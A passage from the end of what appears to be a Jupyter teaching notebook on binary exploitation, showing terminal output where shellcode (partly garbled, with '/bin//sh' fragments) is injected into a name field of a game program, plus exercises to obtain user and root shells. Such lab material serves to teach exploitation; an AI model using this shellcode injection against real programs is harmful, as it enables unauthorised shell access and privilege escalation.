    "6 - Reset your account at 500 credits\n",
    "7 - Quit\n",
    "[Name: �����������������������������������������������������������������1�1�1ə��j\n",
    "                                                                                 XQh//shh/bin��Q��S��]\n",
    "[You have 928410 credits] ->  Enter your choice [1-7]: \n",
    "[DEBUG] current_game pointer 0x08050141\n",
    "ls\n",
    "zsh: broken pipe         cat lucky7_final_exploit.bin - | \n",
    "zsh: segmentation fault  ./lucky7.exe\n",
    "\n",
    "```\n",
    "\n",
    "\n",
    "## Exercise\n",
    "- smuggle the shellcode into the name field, find it's address and exploit the program.\n",
    "- smuggle both user and root shells"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
